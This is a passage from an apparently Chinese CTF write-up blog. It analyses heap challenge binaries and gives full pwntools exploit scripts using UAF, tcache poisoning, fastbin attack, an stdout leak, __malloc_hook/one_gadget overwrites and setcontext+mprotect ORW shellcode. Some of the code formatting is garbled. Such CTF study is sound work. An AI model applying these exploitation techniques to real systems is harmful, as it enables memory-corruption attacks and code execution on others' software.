class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input size:&quot;</span>);<br>  size = get_Int();<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">0</span>xF || size &gt; <span class="hljs-number">0</span>x60 )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  heap_array[idx] = malloc(size);<br>  result = size_array;<br>  size_array[idx] = size;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>edit：根据index找到堆块地址和堆块大小，然后写入内容。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssize_t edit()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input context:&quot;</span>);<br>  return read(<span class="hljs-number">0</span>, (void *)heap_array[idx], (int)size_array[idx]);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>delete：根据index找到堆块地址，然后释放，没有将指针置为0，存在<code>UAF</code>漏洞<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">void <span class="hljs-keyword">delete</span>()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  free((void *)heap_array[idx]);                <span class="hljs-regexp">//</span> UAF<br>&#125;<br></code></pre></td></tr></table></figure></li><li>show：根据index找到堆块地址，然后打印出堆块内容<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">int show()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  return puts((const char *)heap_array[idx]);   <span class="hljs-regexp">//</span> \x00截断<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ul><li>由于无法使用<code>execve</code>函数，所以我们不能getshell，只能尝试通过<code>ORW</code>获取flag；</li><li>要采用<code>ORW</code>首先需要知道heapbase和libcbase，先多次释放堆块，然后使用UAF漏洞获取heapbase；</li><li>使用<code>tcache poisoning</code>申请<code>tcache struct</code>的堆块，修改计数器之后，然后释放进入<code>unsorted bin</code>，最好利用<code>UAF</code>漏洞获取libcbase；</li><li>然后利用<code>tcache poisoning</code>修改<code>__free_hook</code>为<code>ROP</code>即可。</li><li><code>ROP</code>思路：将<code>__free_hook</code>修改为<code>setcontext+53</code>,然后利用布置好的内存偏移的值调用<code>mprotect</code>函数修改指定内存权限为<code>rwx</code>，然后执行read函数将<code>ORW</code>读入该内存区域并执行。（<code>mprotect</code>函数修改的内存区域覆盖了读取<code>ORW</code>的<code>ROP</code>所在区域，所以可以执行）</li></ul><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :tcache poisoning + UAF + ORW（setcontext + mprotect）</span><br><span class="hljs-string">@时间        :2021/09/28 09:43:55</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(idx, sz):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(1))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input size:\n&#x27;</span>, str(sz))<br><br>def delete(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(2))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br><br>def <span class="hljs-built_in">edit</span>(idx, ct):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(3))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;input context:\n&#x27;</span>, ct)<br><br>def show(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(4))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br><br><span class="hljs-comment"># 清理一下tcache bins,减少沙盒对堆的影响，方便调试</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(8):<br>    <span class="hljs-built_in">add</span>(0,0x10)<br><span class="hljs-built_in">add</span>(0,0x40)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(0,0x60)<br><br>log.success(<span class="hljs-string">&quot;*********leak heapbase**********&quot;</span>)<br><span class="hljs-built_in">add</span>(1,0x60)<br><span class="hljs-built_in">add</span>(2,0x60)<br>delete(1)<br>delete(2)<br>show(2)<br><br>heapbase = u64(p.recvuntil(<span class="hljs-string">&#x27;\x55\n&#x27;</span>)[-7:-1].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) &amp; 0xfffffffff000<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;heapbase: &quot;</span> + hex(heapbase))<br><br>log.success(<span class="hljs-string">&quot;*********leak libcbase**********&quot;</span>)<br><span class="hljs-built_in">add</span>(2,0x60)<br><span class="hljs-built_in">edit</span>(1,p64(heapbase + 0x10)) # 指向tcache struct<br><span class="hljs-built_in">add</span>(1,0x60)<br><span class="hljs-built_in">add</span>(3,0x60) # tcache struct <span class="hljs-attribute">size</span>=0x250<br><br><span class="hljs-built_in">edit</span>(3,b<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*64</span>) # 修改tcache strcut 的计数器<br>delete(3)<br>show(3)<br><br>libc.address = u64(p.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x3ebca0<br>free_hook = libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>setcontext_53 = libc.symbols[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + 53<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;libcbase: &quot;</span> + hex(libc.address))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;free_hook: &quot;</span> + hex(free_hook))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;set_context_53: &quot;</span> + hex(setcontext_53))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;mprotect: &quot;</span> + hex(mprotect))<br><br>log.success(<span class="hljs-string">&quot;*********ORW**********&quot;</span>)<br><br><span class="hljs-built_in">add</span>(4,0x58) # 第一次切割tcache struct<br><span class="hljs-built_in">edit</span>(4,b<span class="hljs-string">&#x27;\x00&#x27;</span><span class="hljs-number">*0</span>x58)<br><span class="hljs-built_in">add</span>(5,0x38) # 第二次切割tcache struct<br><span class="hljs-built_in">edit</span>(5,p64(free_hook)) #设置tcache struct中0x60大小的地址为__free_hook<br><span class="hljs-built_in">add</span>(6,0x58) # <span class="hljs-attribute">idx</span>=6 指向free_hook<br><br><span class="hljs-built_in">add</span>(1,0x30) # 这几个chunk是用来布置偏移量，从而利用setcontext设置寄存器 <br><span class="hljs-built_in">add</span>(2,0x10) <br><span class="hljs-built_in">add</span>(3,0x30) # 该chunk的偏移量范围可以设置r15,rdi,rsi,rbp,rbx,rdx （此处只有rdi,rsi,rdx有用）<br><span class="hljs-built_in">add</span>(4,0x30) # 跟<span class="hljs-attribute">idx</span>=7用户空间大小指针偏移0xa0 该chunk的偏移量范围可以设置 rsp,rcx(进而控制pc)<br><br>fake_stack = free_hook &amp; 0xfffffffff000<br><br><span class="hljs-comment"># 写入用于ORW的shellcode到</span><br>sys_read = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rsi,%d</span><br><span class="hljs-string">mov rdx,0x1000</span><br><span class="hljs-string">mov eax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span> % fake_stack<br><br><span class="hljs-comment"># 当 free 堆块时堆地址作为参数放在 rdi 传入函数中</span><br><br><span class="hljs-comment"># mprotect(fake_stack,0x1000,7)</span><br>mprotect_args = p64(0)  # r15<br>mprotect_args += p64(fake_stack) #rdi<br>mprotect_args += p64(0x1000) # rsi<br>mprotect_args += p64(0) # rbp<br>mprotect_args += p64(0) # rbx<br>mprotect_args += p64(7) # rdx<br><br><br><span class="hljs-built_in">edit</span>(6,p64(setcontext_53) + p64(free_hook + 0x10) + asm(sys_read))<br><span class="hljs-built_in">edit</span>(3,mprotect_args)<br><span class="hljs-built_in">edit</span>(4,p64(free_hook + 8) + p64(mprotect)) # 分别是 rsp、rcx()<br><br>delete(1)<br><br>sleep(0.5)<br><br><span class="hljs-comment"># fd = open(&#x27;/flag&#x27;,O_RDONLY)</span><br><span class="hljs-comment"># read(fd,addr,1024)</span><br><span class="hljs-comment"># write(1,addr,1024)</span><br>orw = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">mov rax, 0x67616c662f ;// /flag</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rsp ;// /flag</span><br><span class="hljs-string">mov rsi, 0 ;// O_RDONLY</span><br><span class="hljs-string">xor rdx, rdx ;</span><br><span class="hljs-string">mov rax, 2 ;// SYS_open</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rax ;// fd </span><br><span class="hljs-string">mov rsi,rsp  ;</span><br><span class="hljs-string">mov rdx, 1024 ;// nbytes</span><br><span class="hljs-string">mov rax,0 ;// SYS_read</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1 ;// fd </span><br><span class="hljs-string">mov rsi, rsp ;// buf</span><br><span class="hljs-string">mov rdx, rax ;// count </span><br><span class="hljs-string">mov rax, 1 ;// SYS_write</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 0 ;// error_code</span><br><span class="hljs-string">mov rax, 60</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br>p.sendline(asm(orw))<br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></li><li><a href="https://blog.csdn.net/yongbaoii/article/details/120383873">https://blog.csdn.net/yongbaoii/article/details/120383873</a></li><li><a href="https://www.anquanke.com/post/id/253659#h3-9">https://www.anquanke.com/post/id/253659#h3-9</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ORW</tag>
      
      <tag>heap</tag>
      
      <tag>tcache poisoning</tag>
      
      <tag>UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021长城杯-K1ng_in_h3Ap_I</title>
    <link href="/2021/11/05/changancup2021-K1ng-in-h3Ap-I/"/>
    <url>/2021/11/05/changancup2021-K1ng-in-h3Ap-I/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年长城杯的一道pwn题，偏简单。</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li>使用libc-2.223.so(2.23-0ubuntu11.3)</li><li><code>file pwn</code></li></ul><figure class="highlight plaintext"><figcaption><span>ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter</span><a href="/lib64/ld-linux-x86-64.so.2,">for GNU/Linux 2.6.32, BuildID[sha1]</a></figcaption><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs pwn:">```<br>- `checksec pwn`<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs"> Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre></div> <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><br><span class="hljs-meta">## 0x2 功能分析</span><br><br>- <span class="hljs-keyword">add</span>: 由于可覆盖idx，所以可以申请任意个堆块，堆块大小限制为<span class="hljs-number">0</span>~<span class="hljs-number">0xF0</span>，申请成功之后就把地址和堆块大小分别存储在两个数组中； <br></code></pre></td></tr></table></figure><p>_DWORD *add()<br>{<br>  _DWORD *result; &#x2F;&#x2F; rax<br>  int idx; &#x2F;&#x2F; [rsp+8h] [rbp-8h]<br>  int size; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]</p><p>  puts(“input index:”);<br>  idx &#x3D; get_Int();<br>  if ( idx &lt; 0 || idx &gt; 10 )<br>    exit(0);<br>  puts(“input size:”);<br>  size &#x3D; get_Int();<br>  if ( size &lt; 0 || size &gt; 0xF0 )<br>    exit(0);<br>  heap_array[idx] &#x3D; malloc(size);<br>  result &#x3D; size_array;<br>  size_array[idx] &#x3D; size;<br>  return result;<br>}</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">- <span class="hljs-keyword">edit</span>：根据<span class="hljs-keyword">index</span>找到堆块地址和堆块大小，然后写入内容，输入函数存在`off-<span class="hljs-keyword">by</span>-one`漏洞<br><br></code></pre></td></tr></table></figure><p>__int64 edit()<br>{<br>  int idx; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]</p><p>  puts(“input index:”);<br>  idx &#x3D; get_Int();<br>  if ( idx &lt; 0 || idx &gt; 15 || !heap_array[idx] )<br>    exit(0);<br>  puts(“input context:”);<br>  return Read(heap_array[idx], (unsigned int)size_array[idx]);&#x2F;&#x2F; off-by-one<br>}</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">- <span class="hljs-keyword">delete</span>：根据<span class="hljs-keyword">index</span>找到堆块地址，然后释放，没有将指针置为<span class="hljs-number">0</span>，存在<span class="hljs-string">`UAF`</span>漏洞<br></code></pre></td></tr></table></figure><p>void delete()<br>{<br>  int idx; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]</p><p>  puts(“input index:”);<br>  idx &#x3D; get_Int();<br>  if ( idx &lt; 0 || idx &gt; 10 || !*((_QWORD <em>)&amp;heap_array + idx) || !size_array[idx] )<br>    exit(0);<br>  free(</em>((void **)&amp;heap_array + idx));          &#x2F;&#x2F; UAF<br>}</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>magic：打印出printf函数地址的后三字节<br></code></pre></td></tr></table></figure><p>int magic()<br>{<br>  return printf(“%p\n”, (const void *)((unsigned __int64)&amp;printf &amp; 0xFFFFFF));<br>}</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>## <span class="hljs-number">0</span>x3 利用思路<br><br>- 由于没有输出函数，所以无法通过`UAF`来泄露`main_arena + offset`，从而获取libcbase，考虑利用`stdout`来泄露libc；<br>- 根据`printf`函数（在libc中）地址的后三位，我们可以根据固定偏移量推算出libc中`stdout`的地址；<br>- 当堆块释放到`unsorted bin`中时，fd和bk都是`main_arena + offset`，此时我们利用`UAF`漏洞修改fd的低<span class="hljs-number">2</span>字节（调试发现`main_arena`的地址和`stdout`的地址只有最好两字节有差异）为`stdout-<span class="hljs-number">0</span>x43`的地址即可（需要满足size检测）；<br>- 再次申请堆块获取`stdout`的控制权限,修改flags=<span class="hljs-number">0</span>xfbad1800，`_IO_read_ptr`，`_IO_read_base`和`_IO_read_end`为<span class="hljs-number">0</span>，即可泄露出关于libc的地址；<br>- 然后使用`UAF`和`fastbin attack`来修改`__malloc_hook`和`__realloc_hook`为`realloc`和`one_gadget`。<br><br>## <span class="hljs-number">0</span>x4 Exp<br><br></code></pre></td></tr></table></figure><p>#!&#x2F;usr&#x2F;bin&#x2F;env python3</p><h1 id="encoding-utf-8"><a href="#encoding-utf-8" class="headerlink" title="-- encoding: utf-8 --"></a>-<em>- encoding: utf-8 -</em>-</h1><p>‘’’<br>@文件        :exp.py<br>@说明        :fastbin attack &#x3D;&#x3D;&gt; stdout泄露libcbase; UAF &#x3D;&#x3D;&gt; fastbin attack to malloc_hook realloc_hook<br>             好像无需知道printf部分地址也行，因为main_arena应该与stdout的偏移也应该是固定的<br>@时间        :2021&#x2F;09&#x2F;27 16:59:14<br>@作者        :sh0ve1<br>@防护<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>‘’’</p><p>from pwn import *<br>import pwnlib</p><h1 id="context-log-level-x3D-‘debug’"><a href="#context-log-level-x3D-‘debug’" class="headerlink" title="context.log_level &#x3D; ‘debug’"></a>context.log_level &#x3D; ‘debug’</h1><p>context.arch &#x3D; ‘amd64’<br>context.os &#x3D; ‘linux’</p><p>p &#x3D; process(‘.&#x2F;pwn’)<br>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’)</p><p>def add(idx, sz):<br>    p.sendlineafter(‘&gt;&gt; ‘, str(1))<br>    p.sendlineafter(‘input index:’, str(idx))<br>    p.sendlineafter(‘input size:’, str(sz))</p><p>def delete(idx):<br>    p.sendlineafter(‘&gt;&gt; ‘, str(2))<br>    p.sendlineafter(‘input index:’, str(idx))</p><p>def edit(idx, ct):<br>    p.sendlineafter(‘&gt;&gt; ‘, str(3))<br>    p.sendlineafter(‘input index:’, str(idx))<br>    p.sendafter(‘input context:’, ct)</p><p>def magic():<br>    p.sendlineafter(‘&gt;&gt; ‘, str(666))</p><p>magic()<br>p.recvuntil(‘0x’)<br>printf_last_3_Bytes &#x3D; int(p.recv(6),16)<br>stdout_last_3_Bytes &#x3D; printf_last_3_Bytes + 0x36fe10</p><p>log.info(“printf_last_3_Bytes: “ + hex(printf_last_3_Bytes))<br>log.info(“stdout_last_3_Bytes: “ + hex(stdout_last_3_Bytes))</p><p>add(0,0x18)<br>add(1,0x20)<br>add(2,0x60)<br>add(3,0x10)<br>edit(0,b’A’*0x18 + b’\xa1’)<br>delete(1)<br>delete(2)<br>add(1,0x20)<br>edit(2,p16((stdout_last_3_Bytes&amp;0xffff)-0x43) + b’\n’) #必须设置为stdout前0x43字节，才能满足size要求</p><p>add(2,0x60)<br>add(4,0x60) # idx&#x3D;4 指向stdout-0x33  </p><p>#本题中，修改flags为0xfbad1800之后，后面的就没输入进去了？<br>payload &#x3D; b’\x00’*0x33 + p64(0xfbad1800) + p64(0)*3 + b’\x00’ + b’\n’<br>edit(4,payload)</p><p>libc.address &#x3D; u64(p.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))-0x3c5600<br>realloc &#x3D; libc.sym[‘__libc_realloc’] # __libc_realloc<br>__malloc_hook &#x3D; libc.sym[‘__malloc_hook’]<br>one &#x3D; [0x45226,0x4527a,0xf03a4,0xf1247]<br>onegadget &#x3D; libc.address + one[1]</p><p>log.info(“libc.address: “ + hex(libc.address))<br>log.info(“realloc: “ + hex(realloc))<br>log.info(“__malloc_hook: “ + hex(__malloc_hook))<br>log.info(“onegadget: “ + hex(onegadget))</p><p>delete(2)<br>edit(2,p64(__malloc_hook - 0x23) + b’\n’) # UAF<br>add(5,0x60)<br>add(6,0x60) # idx&#x3D;6 指向 __malloc_hook - 0x23</p><p>payload &#x3D; b’A’*(0x13 - 8) + p64(onegadget) + p64(realloc+12) + b’\n’<br>edit(6,payload)</p><h1 id="pwnlib-gdb-attach-p-”b-libc-malloc”"><a href="#pwnlib-gdb-attach-p-”b-libc-malloc”" class="headerlink" title="pwnlib.gdb.attach(p,”b __libc_malloc”)"></a>pwnlib.gdb.attach(p,”b __libc_malloc”)</h1><p>add(7,0x10) #触发</p><p>p.interactive()<br>p.close()</p><p>&#96;&#96;&#96;</p><h2 id="0x5-Rference"><a href="#0x5-Rference" class="headerlink" title="0x5 Rference"></a>0x5 Rference</h2><ul><li><a href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>UAF</tag>
      
      <tag>fastbin attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>starCTF2021-babyheap</title>
    <link href="/2021/11/04/starCTF2021-babyheap/"/>
    <url>/2021/11/04/starCTF2021-babyheap/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年的<code>*CTF</code>中的一道题，赛后复现。</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li>采用<code>libc-2.27.so</code>（2.27-3ubuntu1.4_amd64）</li><li><code>file pwn</code></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1.<span class="hljs-number">4</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=fb33d5a171e2edbd2bc27958e08714ca9e3a58cc, not stripped<br></code></pre></td></tr></table></figure><ul><li><code>checksec pwn</code> 保护全开<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br><br></code></pre></td></tr></table></figure></li></ul><h2 